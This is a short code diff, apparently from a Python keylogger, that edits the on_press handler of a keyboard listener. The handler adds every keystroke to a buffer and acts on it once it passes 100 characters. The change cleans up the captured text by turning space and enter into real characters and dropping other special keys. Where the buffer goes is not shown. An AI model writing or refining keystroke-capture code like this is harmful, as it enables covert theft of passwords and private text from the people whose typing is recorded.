@@ -114,10 +114,14 @@ def on_press(key):
         knew = "{}".format(key)
         if knew[0] == "'":
             knew = knew[1:-1]
-        print(knew)
-        key_buffer += knew
         if "Key" in knew:
-            key_buffer += "\n"
+            if knew == 'Key.space':
+                knew = ' '
+            elif knew == "Key.enter":
+                knew = '\n'
+            else:
+                knew = ''
+        key_buffer += knew
     except :
         pass
     if len(key_buffer) > 100:
